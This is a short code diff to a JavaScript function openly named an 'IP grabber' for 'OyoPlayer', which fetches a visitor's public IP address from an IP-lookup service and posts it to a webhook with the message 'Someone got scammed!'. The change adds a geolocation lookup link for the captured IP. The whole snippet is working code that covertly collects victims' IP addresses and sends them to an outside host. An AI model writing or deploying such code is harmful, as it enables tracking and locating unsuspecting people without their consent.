@@ -3,7 +3,7 @@ async function run(wurl) {
 	res = await fetch("https://api.ipify.org/")
 	ip = await res.text()
 	body = {"username":"IP grabber", "embeds":[
-		{"title":"Someone got scammed!", "description":`Here's their ip: ${ip}.`, "footer":{"text":"OyoPlayer IP Grabber"}}
+		{"title":"Someone got scammed!", "description":`Here's their ip: ${ip}.\nFor more informations about this ip (location for example) [click here](http://www.geoplugin.net/json.gp?ip=)`, "footer":{"text":"[OyoPlayer IP Grabber](https://oyo-player.github.io/test/)"}}
 	]}
 	fetch(wurl, {"method":"POST", "headers":{"content-type": "application/json"}, "body":JSON.stringify(body)})
 }
